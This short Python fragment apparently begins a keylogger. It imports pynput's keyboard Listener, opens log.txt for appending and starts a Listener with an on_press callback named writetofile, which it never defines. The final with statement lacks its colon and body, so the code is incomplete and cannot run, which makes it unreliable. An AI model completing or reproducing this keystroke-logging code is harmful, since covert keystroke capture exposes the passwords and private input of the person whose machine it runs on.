from pynput.keyboard import Listener

with open("log.txt", "a") as fichier:
    fichier.write("\n")

with Listener(on_press=writetofile) as listener